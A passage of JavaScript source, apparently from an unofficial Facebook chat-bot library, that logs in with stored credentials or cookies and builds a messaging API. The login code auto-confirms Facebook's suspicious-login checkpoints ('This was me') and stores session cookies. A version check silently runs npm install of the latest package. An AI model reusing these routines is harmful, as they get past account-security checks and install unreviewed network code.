 * @param {{ [x: string]: boolean; selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize: any; online?: boolean; emitReady?: boolean; userAgent: any; logLevel?: any; pageID?: any; proxy?: any; }} globalOptions
 * @param {{ [x: string]: any; logLevel?: any; forceLogin?: boolean; userAgent?: any; pauseLog?: any; logRecordSize?: any; pageID?: any; proxy?: any; }} options
 */

function setOptions(globalOptions, options) {
    Object.keys(options).map(function(key) {
        switch (Boolean_Option.includes(key)) {
            case true: {
                globalOptions[key] = Boolean(options[key]);
                break;
            }
            case false: {
                switch (key) {
                    case 'pauseLog': {
                        if (options.pauseLog) log.pause();
                            else log.resume();
                        break;
                    }
                    case 'logLevel': {
                        log.level = options.logLevel;
                            globalOptions.logLevel = options.logLevel;
                        break;
                    }
                    case 'logRecordSize': {
                        log.maxRecordSize = options.logRecordSize;
                            globalOptions.logRecordSize = options.logRecordSize;
                        break;
                    }
                    case 'pageID': {
                        globalOptions.pageID = options.pageID.toString();
                        break;
                    }
                    case 'userAgent': {
                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
                        break;
                    }
                    case 'proxy': {
                        if (typeof options.proxy != "string") {
                            delete globalOptions.proxy;
                            utils.setProxy();
                        } else {
                            globalOptions.proxy = options.proxy;
                            utils.setProxy(globalOptions.proxy);
                        }
                        break;
                    }
                    default: {
                        log.warn("setOptions", "Unrecognized option given to setOptions: " + key);
                        break;
                    }
                }
            break;
            }
        }
    });
}

/!-[ Function BuildAPI ]-!/

/**
 * @param {any} globalOptions
 * @param {string} html
 * @param {{ getCookies: (arg0: string) => any[]; }} jar
 */

function buildAPI(globalOptions, html, jar) {
    var maybeCookie = jar.getCookies("https://www.facebook.com").filter(function(/** @type {{ cookieString: () => string; }} */val) { return val.cookieString().split("=")[0] === "c_user"; });

    if (maybeCookie.length === 0) {
        switch (globalThis.Fca.Require.FastConfig.AutoLogin) {
            case true: {
                globalThis.Fca.Require.logger.Warning(globalThis.Fca.Require.Language.Index.AutoLogin, function() {
                    return globalThis.Fca.AutoLogin();
                });
                break;
            }
            case false: {
                throw { error: globalThis.Fca.Require.Language.Index.ErrAppState };
                
            }
        }
    }

    if (html.indexOf("/checkpoint/block/?next") > -1) log.warn("login", Language.CheckPointLevelI);

    var userID = maybeCookie[0].cookieString().split("=")[1].toString();
    process.env['UID'] = logger.Normal(getText(Language.UID,userID), userID);

    try {
        clearInterval(checkVerified);
    } catch (e) {
        console.log(e);
    }

    var clientID = (Math.random() * 2147483648 | 0).toString(16);

    var CHECK_MQTT = {
        oldFBMQTTMatch: html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/),
        newFBMQTTMatch: html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/),
        legacyFBMQTTMatch: html.match(/(\["MqttWebConfig",\[\],{fbid:")(.+?)(",appID:219994525426954,endpoint:")(.+?)(",pollingEndpoint:")(.+?)(3790])/)
    }

    let Slot = Object.keys(CHECK_MQTT);
    
    var mqttEndpoint,region,irisSeqID;
    Object.keys(CHECK_MQTT).map(function(MQTT) {
        if (CHECK_MQTT[MQTT] && !region) {
            switch (Slot.indexOf(MQTT)) {
                case 0: {
                    irisSeqID = CHECK_MQTT[MQTT][1];
                        mqttEndpoint = CHECK_MQTT[MQTT][2];
                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
                    return;
                }
                case 1: {
                    irisSeqID = CHECK_MQTT[MQTT][2];
                        mqttEndpoint = CHECK_MQTT[MQTT][1].replace(/\\\//g, "/");
                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
                    return;
                }
                case 2: {
                    mqttEndpoint = CHECK_MQTT[MQTT][4];
                        region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
                    return;
                }
            }
        return;
        }
    });    

    var ctx = {
        userID: userID,
        jar: jar,
        clientID: clientID,
        globalOptions: globalOptions,
        loggedIn: true,
        access_token: 'NONE',
        clientMutationId: 0,
        mqttClient: undefined,
        lastSeqId: irisSeqID,
        syncToken: undefined,
        mqttEndpoint: mqttEndpoint,
        region: region,
        firstListen: true
    };

    var api = {
        setOptions: setOptions.bind(null, globalOptions),
        getAppState: function getAppState() {
            return utils.getAppState(jar);
        }
    };

    if (region && mqttEndpoint) {
        //do sth
    }
    else {
        log.warn("login", getText(Language.NoAreaData));
        api["htmlData"] = html;
    }

    var defaultFuncs = utils.makeDefaults(html, userID, ctx);

    fs.readdirSync(__dirname + "/src").filter((/** @type {string} */File) => File.endsWith(".js") && !File.includes('Dev_')).map((/** @type {string} */File) => api[File.split('.').slice(0, -1).join('.')] = require('./src/' + File)(defaultFuncs, api, ctx));

    return {
        ctx,
        defaultFuncs, 
        api
    };
}

/!-[ Function makeLogin ]-!/

/**
 * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar
 * @param {any} email
 * @param {any} password
 * @param {{ forceLogin: any; }} loginOptions
 * @param {(err: any, api: any) => any} callback
 * @param {any} prCallback
 */

function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
    return function(/** @type {{ body: any; }} */res) {
        var html = res.body,$ = cheerio.load(html),arr = [];

        $("#login_form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));

        arr = arr.filter(function(v) {
            return v.val && v.val.length;
        });

        var form = utils.arrToForm(arr);
            form.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
            form.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
            form.email = email;
            form.pass = password;
            form.default_persistent = '0';
            form.locale = 'en_US';     
            form.timezone = '240';
            form.lgnjs = ~~(Date.now() / 1000);

        html.split("\"_js_").slice(1).map((/** @type {any} */val) => {
            jar.setCookie(utils.formatCookie(JSON.parse("[\"" + utils.getFrom(val, "", "]") + "]"), "facebook"),"https://www.facebook.com")
        });

        logger.Normal(Language.OnLogin);
        return utils
            .post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, form, loginOptions)
            .then(utils.saveCookies(jar))
            .then(function(/** @type {{ headers: any; }} */res) {
                var headers = res.headers;  
                if (!headers.location) throw { error: Language.InvaildAccount };

                // This means the account has login approvals turned on.
                if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
                    logger.Warning(Language.TwoAuth);
                    var nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';

                    return utils
                        .get(headers.location, jar, null, loginOptions)
                        .then(utils.saveCookies(jar))
                        .then(async function(/** @type {{ body: any; }} */res) {
                            if (!await Database.get('ThroughAcc')) {
                                await Database.set('ThroughAcc', email);
                            }
                            else {
                                if (String((await Database.get('ThroughAcc'))).replace(RegExp('"','g'), '') != String(email).replace(RegExp('"','g'), '')) {
                                    await Database.set('ThroughAcc', email);
                                    if (await Database.get('Through2Fa')) {
                                        await Database.delete('Through2Fa');
                                    }
                                }
                            }
                            var html = res.body,$ = cheerio.load(html), arr = [];
                            $("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
                            arr = arr.filter(v => { return v.val && v.val.length });
                            var form = utils.arrToForm(arr);
                            if (html.indexOf("checkpoint/?next") > -1) {
                                setTimeout(() => {
                                    checkVerified = setInterval((_form) => {}, 5000, {
                                        fb_dtsg: form.fb_dtsg,
                                        jazoest: form.jazoest,
                                        dpr: 1
                                    });
                                }, 2500);  
                                switch (globalThis.Fca.Require.FastConfig.Login2Fa) {
                                    case true: {
                                        try {
                                            const question = question => {
                                                const rl = readline.createInterface({
                                                    input: process.stdin,
                                                    output: process.stdout
                                                });
                                                return new Promise(resolve => {
                                                    rl.question(question, answer => {
                                                        rl.close();
                                                        return resolve(answer);
                                                    });
                                                });
                                            };
                                            async function EnterSecurityCode() {
                                                try {
                                                    var Through2Fa = await Database.get('Through2Fa');
                                                    if (Through2Fa) {
                                                        Through2Fa.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {
                                                            let str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
                                                            jar.setCookie(str, "http://" + c.domain);
                                                        })
                                                        var from2 = utils.arrToForm(arr);
                                                            from2.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
                                                            from2.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
                                                            from2.email = email;
                                                            from2.pass = password;
                                                            from2.default_persistent = '0';
                                                            from2.locale = 'en_US';     
                                                            from2.timezone = '240';
                                                            from2.lgnjs = ~~(Date.now() / 1000);
                                                        return utils
                                                            .post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, from2, loginOptions)
                                                            .then(utils.saveCookies(jar))
                                                            .then(function(/** @type {{ headers: any; }} */res) {
                                                        var headers = res.headers;  
                                                        if (!headers['set-cookie'][0].includes('deleted')) {
                                                            logger.Warning(Language.ErrThroughCookies, async function() {
                                                                await Database.delete('Through2Fa');
                                                            });
                                                            process.exit(1);
                                                        }
                                                            if (headers.location && headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
                                                                return utils
                                                                    .get(headers.location, jar, null, loginOptions)
                                                                    .then(utils.saveCookies(jar))
                                                                    .then(function(/** @type {{ body: any; }} */res) {
                                                                        var html = res.body,$ = cheerio.load(html), arr = [];
                                                                        $("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));
                                                                        arr = arr.filter(v => { return v.val && v.val.length });
                                                                        var from2 = utils.arrToForm(arr);
                                                                        
                                                                        if (html.indexOf("checkpoint/?next") > -1) {
                                                                            setTimeout(() => {
                                                                                checkVerified = setInterval((_form) => {}, 5000, {
                                                                                    fb_dtsg: from2.fb_dtsg,
                                                                                    jazoest: from2.jazoest,
                                                                                    dpr: 1
                                                                                });
                                                                            }, 2500);
                                                                            if (!res.headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {
                                                                                try {
                                                                                    delete from2.name_action_selected;
                                                                                    from2['submit[Continue]'] = $("#checkpointSubmitButton").html();
                                                                                    return utils
                                                                                        .post(nextURL, jar, from2, loginOptions)
                                                                                        .then(utils.saveCookies(jar))
                                                                                        .then(function() {
                                                                                            from2['submit[This was me]'] = "This was me";
                                                                                            return utils.post(nextURL, jar, from2, loginOptions).then(utils.saveCookies(jar));
                                                                                        })
                                                                                        .then(function() {
                                                                                            delete from2['submit[This was me]'];
                                                                                            from2.name_action_selected = 'save_device';
                                                                                            from2['submit[Continue]'] = $("#checkpointSubmitButton").html();
                                                                                            return utils.post(nextURL, jar, from2, loginOptions).then(utils.saveCookies(jar));
                                                                                        })
                                                                                        .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                                                                            var headers = res.headers;
                                                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: "wtf ??:D" };
                                                                                            var appState = utils.getAppState(jar,false);
                                                                                            await Database.set('Through2Fa', appState);
                                                                                            return loginHelper(appState, email, password, loginOptions, callback);
                                                                                        })
                                                                                    .catch((/** @type {any} */e) => callback(e));
                                                                                }
                                                                                catch (e) {
                                                                                    console.log(e)
                                                                                }
                                                                            }
                                                                        }
                                                                    })
                                                                }
                                                            return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
                                                        }).catch((/** @type {any} */e) => console.log(e));
                                                    }
                                                }
                                                catch (e) {
                                                    await Database.delete('Through2Fa');
                                                }
                                            var code = await question(Language.EnterSecurityCode);
                                                try {
                                                    form.approvals_code = code;
                                                    form['submit[Continue]'] = $("#checkpointSubmitButton").html();
                                                    var prResolve,prReject;
                                                    var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });
                                                    if (typeof code == "string") { //always strings
                                                        utils
                                                            .post(nextURL, jar, form, loginOptions)
                                                            .then(utils.saveCookies(jar))
                                                            .then(function(/** @type {{ body: string | Buffer; }} */res) {
                                                                var $ = cheerio.load(res.body);
                                                                var error = $("#approvals_code").parent().attr("data-xui-error");
                                                                if (error) {
                                                                        logger.Warning(Language.InvaildTwoAuthCode,function() { EnterSecurityCode(); }); //bruh loop
                                                                    };
                                                                })
                                                            .then(function() {
                                                                delete form.no_fido;delete form.approvals_code;
                                                                form.name_action_selected = 'save_device'; //'save_device' || 'dont_save;
                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                                            })  
                                                            .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                                                var headers = res.headers;
                                                                if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {
                                                                    try {
                                                                        delete form.name_action_selected;
                                                                        form['submit[Continue]'] = $("#checkpointSubmitButton").html();
                                                                        return utils
                                                                            .post(nextURL, jar, form, loginOptions)
                                                                            .then(utils.saveCookies(jar))
                                                                            .then(function() {
                                                                                form['submit[This was me]'] = "This was me";
                                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                                                            })
                                                                            .then(function() {
                                                                                delete form['submit[This was me]'];
                                                                                form.name_action_selected = 'save_device';
                                                                                form['submit[Continue]'] = $("#checkpointSubmitButton").html();
                                                                                return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                                                            })
                                                                            .then(async function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                                                                var headers = res.headers;
                                                                                if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: "wtf ??:D" };
                                                                                var appState = utils.getAppState(jar,false);
                                                                                await Database.set('Through2Fa', appState);
                                                                                return loginHelper(appState, email, password, loginOptions, callback);
                                                                            })
                                                                        .catch((/** @type {any} */e) => callback(e));
                                                                    }
                                                                    catch (e) {
                                                                        console.log(e)
                                                                    }
                                                                }
                                                                var appState = utils.getAppState(jar,false);
                                                                if (callback === prCallback) {
                                                                    callback = function(/** @type {any} */err, /** @type {any} */api) {
                                                                        if (err) return prReject(err);
                                                                        return prResolve(api);
                                                                    };
                                                                }
                                                                await Database.set('Through2Fa', appState);
                                                                return loginHelper(appState, email, password, loginOptions, callback);
                                                            })
                                                            .catch(function(/** @type {any} */err) {
                                                                if (callback === prCallback) prReject(err);
                                                                else callback(err);
                                                            });
                                                    } else {
                                                        utils
                                                            .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
                                                            .then(utils.saveCookies(jar))
                                                            .then(async function(/** @type {{ body: string; }} */res) {
                                                                try { 
                                                                    JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
                                                                } catch (ex) {
                                                                    clearInterval(checkVerified);
                                                                    logger.Warning(Language.VerifiedCheck);
                                                                    if (callback === prCallback) {
                                                                        callback = function(/** @type {any} */err, /** @type {any} */api) {
                                                                            if (err) return prReject(err);
                                                                            return prResolve(api);
                                                                        };
                                                                    }
                                                                    let appState = utils.getAppState(jar,false);
                                                                    return loginHelper(appState, email, password, loginOptions, callback);
                                                                }
                                                            })
                                                            .catch((/** @type {any} */ex) => {
                                                                log.error("login", ex);
                                                                if (callback === prCallback) prReject(ex);
                                                                else callback(ex);
                                                            });
                                                    }
                                                    return rtPromise;  
                                                }
                                                catch (e) {
                                                    logger.Error(e)
                                                    logger.Error()
                                                    process.exit(0)
                                                }
                                            }
                                            await EnterSecurityCode()
                                        }
                                        catch (e) {
                                            logger.Error(e)
                                            logger.Error();
                                            process.exit(0);
                                        }
                                    } 
                                        break;
                                    case false: {
                                        throw {
                                            error: 'login-approval',
                                            continue: function submit2FA(/** @type {any} */code) {
                                                form.approvals_code = code;
                                                form['submit[Continue]'] = $("#checkpointSubmitButton").html(); //'Continue';
                                                var prResolve,prReject;
                                                var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });
                                                if (typeof code == "string") {
                                                    utils
                                                        .post(nextURL, jar, form, loginOptions)
                                                        .then(utils.saveCookies(jar))
                                                        .then(function(/** @type {{ body: string | Buffer; }} */res) {
                                                            var $ = cheerio.load(res.body);
                                                            var error = $("#approvals_code").parent().attr("data-xui-error");
                                                            if (error) {
                                                                throw {
                                                                    error: 'login-approval',
                                                                    errordesc: Language.InvaildTwoAuthCode,
                                                                    lerror: error,
                                                                    continue: submit2FA
                                                                };
                                                            }
                                                        })
                                                        .then(function() {
                                                            delete form.no_fido;delete form.approvals_code;
                                                            form.name_action_selected = 'dont_save'; //'save_device' || 'dont_save;
                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                                        })
                                                        .then(function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                                            var headers = res.headers;
                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: Language.ApprovalsErr };
                                                            var appState = utils.getAppState(jar,false);
                                                            if (callback === prCallback) {
                                                                callback = function(/** @type {any} */err, /** @type {any} */api) {
                                                                    if (err) return prReject(err);
                                                                    return prResolve(api);
                                                                };
                                                            }
                                                            return loginHelper(appState, email, password, loginOptions, callback);
                                                        })
                                                        .catch(function(/** @type {any} */err) {
                                                            if (callback === prCallback) prReject(err);
                                                            else callback(err);
                                                        });
                                                } else {
                                                    utils
                                                        .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
                                                        .then(utils.saveCookies(jar))
                                                        .then((/** @type {{ body: string; }} */res) => {
                                                            try { 
                                                                JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
                                                            } catch (ex) {
                                                                clearInterval(checkVerified);
                                                                logger.Warning(Language.VerifiedCheck);
                                                                if (callback === prCallback) {
                                                                    callback = function(/** @type {any} */err, /** @type {any} */api) {
                                                                        if (err) return prReject(err);
                                                                        return prResolve(api);
                                                                    };
                                                                }
                                                                return loginHelper(utils.getAppState(jar,false), email, password, loginOptions, callback);
                                                            }
                                                        })
                                                        .catch((/** @type {any} */ex) => {
                                                            log.error("login", ex);
                                                            if (callback === prCallback) prReject(ex);
                                                            else callback(ex);
                                                        });
                                                    }
                                                return rtPromise;
                                            }
                                        };
                                    }
                                }
                            } else {
                                if (!loginOptions.forceLogin) throw { error: Language.ForceLoginNotEnable };

                                if (html.indexOf("Suspicious Login Attempt") > -1) form['submit[This was me]'] = "This was me";
                                else form['submit[This Is Okay]'] = "This Is Okay";

                                return utils
                                    .post(nextURL, jar, form, loginOptions)
                                    .then(utils.saveCookies(jar))
                                    .then(function() {
                                        form.name_action_selected = 'dont_save';

                                        return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                    })
                                    .then(function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                        var headers = res.headers;

                                        if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with review recent login." };

                                        var appState = utils.getAppState(jar,false);

                                        return loginHelper(appState, email, password, loginOptions, callback);
                                    })
                                    .catch((/** @type {any} */e) => callback(e));
                            }
                        });
                }
            return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
        });
    };
}

/!-[ Function backup ]-!/

/**
 * @param {string} data
 * @param {any} globalOptions
 * @param {any} callback
 * @param {any} prCallback
 */

function backup(data,globalOptions, callback, prCallback) {
    try {
        var appstate;
        try {
            appstate = JSON.parse(data)
        }
        catch(e) {
            appstate = data;
        }
            logger.Warning(Language.BackupNoti);
        try {
            loginHelper(appstate,null,null,globalOptions, callback, prCallback)
        }
        catch (e) {
            logger.Error(Language.ErrBackup);
            process.exit(0);
        }
    }
    catch (e) {
        return logger.Error();
    }
}

/!-[ async function loginHelper ]-!/

/**
 * @param {string | any[]} appState
 * @param {any} email
 * @param {any} password
 * @param {{ selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize?: number; online?: boolean; emitReady?: boolean; userAgent?: string; pageID?: any; }} globalOptions
 * @param {(arg0: any, arg1: undefined) => void} callback
 * @param {(error: any, api: any) => any} [prCallback]
 */

async function loginHelper(appState, email, password, globalOptions, callback, prCallback) {
    var mainPromise = null;
    var jar = utils.getJar();

    if (fs.existsSync('./backupappstate.json')) {
        fs.unlinkSync('./backupappstate.json');
    }

try {
    if (appState) {
        logger.Normal(Language.OnProcess);
            switch (await Database.has("FBKEY")) {
                case true: {
                    process.env.FBKEY = await Database.get("FBKEY");
                }
                    break;
                case false: {
                    const SecurityKey = globalThis.Fca.Require.Security.create().apiKey;
                        process.env['FBKEY'] = SecurityKey;
                    await Database.set('FBKEY', SecurityKey);
                }
                    break;
                default: {
                    const SecurityKey = globalThis.Fca.Require.Security.create().apiKey;
                        process.env['FBKEY'] = SecurityKey;
                    await Database.set('FBKEY', SecurityKey);
                }
            }
            try {
                switch (globalThis.Fca.Require.FastConfig.EncryptFeature) {
                    case true: {
                        appState = JSON.parse(JSON.stringify(appState, null, "\t"));
                        switch (utils.getType(appState)) {
                            case "Array": {
                                switch (utils.getType(appState[0])) {
                                    case "Object": {
										logger.Normal(Language.NotReadyToDecrypt);
									}
                                        break;
                                    case "String": {
                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');
                                        logger.Normal(Language.DecryptSuccess);
                                    }
                                }
                            }
                                break;
                            case "Object": {
                                try {
                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
                                    logger.Normal(Language.DecryptSuccess);
                                }
                                catch (e) {
                                    if (process.env.Backup != undefined && process.env.Backup) {
                                    await backup(process.env.Backup,globalOptions, callback, prCallback);
                                }
                                else {
                                    try {
                                        if (await Database.has('Backup')) {
                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
                                        }
                                        else {
                                            logger.Normal(Language.ErrBackup);
                                            process.exit(0);
                                        }
                                    }
                                    catch (e) {
                                        logger.Warning(Language.ErrBackup);
                                        logger.Error();
                                        process.exit(0);
                                    }
                                }
                                    logger.Warning(Language.DecryptFailed);
                                    return logger.Error();
                                }
                            }
                                break;
                            case "String": {
                                try {
                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
                                    logger.Normal(Language.DecryptSuccess);
                                }
                                catch (e) {
                                    if (process.env.Backup != undefined && process.env.Backup) {
                                    await backup(process.env.Backup,globalOptions, callback, prCallback);
                                }
                                else {
                                    try {
                                        if (await Database.has('Backup')) {
                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
                                        }
                                        else {
                                            logger.Normal(Language.ErrBackup);
                                            process.exit(0);
                                        }
                                    }
                                    catch (e) {
                                        logger.Warning(Language.ErrBackup);
                                        logger.Error();
                                        process.exit(0);
                                    }
                                }
                                    logger.Warning(Language.DecryptFailed);
                                    return logger.Error();
                                } 
                            }
                                break;
                            default: {
                                logger.Warning(Language.InvaildAppState);
                                process.exit(0)
                            }
                        } 
                    }
                        break;
                    case false: {
                        switch (utils.getType(appState)) { 
                            case "Array": {
                                logger.Normal(Language.EncryptStateOff);
                            }
                                break;
                            case "Object": {
                                logger.Normal(Language.EncryptStateOff);
                                try {
                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
                                    logger.Normal(Language.DecryptSuccess);
                                }
                                catch (e) {
                                    if (process.env.Backup != undefined && process.env.Backup) {
                                        await backup(process.env.Backup,globalOptions, callback, prCallback);
                                    }
                                else {
                                    try {
                                        if (await Database.has('Backup')) {
                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
                                        }
                                        else {
                                            logger.Warning(Language.ErrBackup);
                                            process.exit(0);
                                        }
                                    }
                                    catch (e) {
                                        logger.Warning(Language.ErrBackup);
                                        logger.Error();
                                        process.exit(0);
                                    }
                                }
                                    logger.Warning(Language.DecryptFailed);
                                    return logger.Error();
                                }
                            }
                                break;
                            default: {
                                logger.Warning(Language.InvaildAppState);
                                process.exit(0)
                            }
                        } 
                    }
                        break;
                    default: {
                        logger.Warning(getText(Language.IsNotABoolean,globalThis.Fca.Require.FastConfig.EncryptFeature))
                        process.exit(0);
                    }
                }
            }
            catch (e) {
                console.log(e);
            }

        try {
            appState = JSON.parse(appState);
        }
        catch (e) {
            try {
                appState = appState;
            }
            catch (e) {
                return logger.Error();
            }
        }
        try {
            globalThis.Fca.Data.AppState = appState;
                appState.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {
                    var str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
                    jar.setCookie(str, "http://" + c.domain);
                });
                process.env.Backup = appState;
                await Database.set('Backup', appState);
            mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));
        } catch (e) {
            if (process.env.Backup != undefined && process.env.Backup) {
                return await backup(process.env.Backup,globalOptions, callback, prCallback);
            }
            try {
                if (await Database.has('Backup')) {
                    return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
                }
                else {
                    logger.Warning(Language.ErrBackup);
                    process.exit(0);
                }
            }
            catch (e) {
                logger.Warning(Language.ErrBackup);
                logger.Error();
                process.exit(0);
            }
        return logger.Warning(Language.ErrBackup); // unreachable 👑 
    }
} else {
    mainPromise = utils
        .get("https://www.facebook.com/", null, null, globalOptions, { noRef: true })
            .then(utils.saveCookies(jar))
            .then(makeLogin(jar, email, password, globalOptions, callback, prCallback))
            .then(function() {
                return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(utils.saveCookies(jar));
            });
        }
    } catch (e) {
        console.log(e);
    }
        var ctx,api;
            mainPromise = mainPromise
                .then(function(/** @type {{ body: string; }} */res) {
                    var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/,redirect = reg.exec(res.body);
                        if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));
                    return res;
                })
                .then(function(/** @type {{ body: any; }} */res) {
                    var html = res.body,Obj = buildAPI(globalOptions, html, jar);
                        ctx = Obj.ctx;
                        api = Obj.api;
                        process.env.api = Obj.api;
                    return res;
                });
            if (globalOptions.pageID) {
                mainPromise = mainPromise
                    .then(function() {
                        return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
                    })
                    .then(function(/** @type {{ body: any; }} */resData) {
                        var url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
                        url = url.substring(0, url.length - 1);
                        return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
                    });
            }
        mainPromise
            .then(function() {
                var { readFileSync } = require('fs-extra');
            const { execSync } = require('child_process');
        Fetch('https://raw.githubusercontent.com/HarryWakazaki/Fca-Horizon-Remake/main/package.json').then(async (/** @type {{ body: { toString: () => string; }; }} */res) => {
            const localVersion = JSON.parse(readFileSync('./node_modules/fca-horizon-remake/package.json')).version;
                if (Number(localVersion.replace(/\./g,"")) < Number(JSON.parse(res.body.toString()).version.replace(/\./g,"")) ) {
                    log.warn("[ FCA-HZI ] •",getText(Language.NewVersionFound,JSON.parse(readFileSync('./node_modules/fca-horizon-remake/package.json')).version,JSON.parse(res.body.toString()).version));
                    if (globalThis.Fca.Require.FastConfig.AutoUpdate == true) { 
                        log.warn("[ FCA-HZI ] •",Language.AutoUpdate);
                            try {
                                execSync('npm install fca-horizon-remake@latest', { stdio: 'inherit' });
                                    logger.Success(Language.UpdateSuccess)
                                        logger.Normal(Language.RestartAfterUpdate);
                                        await new Promise(resolve => setTimeout(resolve,5*1000));
                                    console.clear();process.exit(1);
                                }
                            catch (err) {
                                log.warn('Error Update: ' + err);
                                    logger.Normal(Language.UpdateFailed);
                                try {
                                    require.resolve('horizon-sp');
                                }
                                catch (e) {
                                    logger.Normal(Language.InstallSupportTool);
                                        execSync('npm install horizon-sp@latest', { stdio: 'inherit' });
                                    process.exit(1);
                                }
                                    var fcasp = require('horizon-sp');
                                try {
                                    fcasp.onError()
                                }
                                catch (e) {
                                    logger.Normal(Language.NotiAfterUseToolFail, "[ Fca - Helper ]")
                                        logger.Normal("rmdir ./node_modules after type npm i && npm start","[ Fca - Helper ]");
                                    process.exit(0);
                                }
                            }
                        }
                    }
                else {
                    logger.Normal(getText(Language.LocalVersion,localVersion));
                        logger.Normal(getText(Language.CountTime,globalThis.Fca.Data.CountTime()))   
                            logger.Normal(Language.WishMessage[Math.floor(Math.random()*Language.WishMessage.length)]);
                            require('./Extra/ExtraUptimeRobot')(),require('./Controllers/Remote');
                        DataLanguageSetting.HTML.HTML==true? globalThis.Fca.Require.Web.listen(globalThis.Fca.Require.Web.get('DFP')) : globalThis.Fca.Require.Web = null;
                    callback(null, api);
                }
            });
        }).catch(function(/** @type {{ error: any; }} */e) {
            log.error("login", e.error || e);
        callback(e);
    });
}

/**
 * It asks the user for their account and password, and then saves it to the database.
 */

function setUserNameAndPassWord() {
    let rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    let localbrand2 = JSON.parse(readFileSync('./node_modules/fca-horizon-remake/package.json')).version;
    console.clear();
    console.log(figlet.textSync('Horizon', {font: 'ANSI Shadow',horizontalLayout: 'default',verticalLayout: 'default',width: 0,whitespaceBreak: true }));
